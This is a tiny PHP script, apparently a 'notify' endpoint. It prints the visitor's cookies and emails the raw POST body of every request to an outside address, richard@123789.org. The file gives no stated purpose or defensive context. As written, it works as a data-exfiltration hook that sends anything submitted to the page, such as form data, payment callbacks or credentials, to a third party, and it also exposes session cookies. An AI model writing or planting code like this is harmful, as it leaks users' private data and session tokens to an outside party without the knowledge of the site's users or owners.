<?php
echo "notify";

print_r($_COOKIE);
mail('richard@123789.org','notify',print_r($HTTP_RAW_POST_DATA,true));


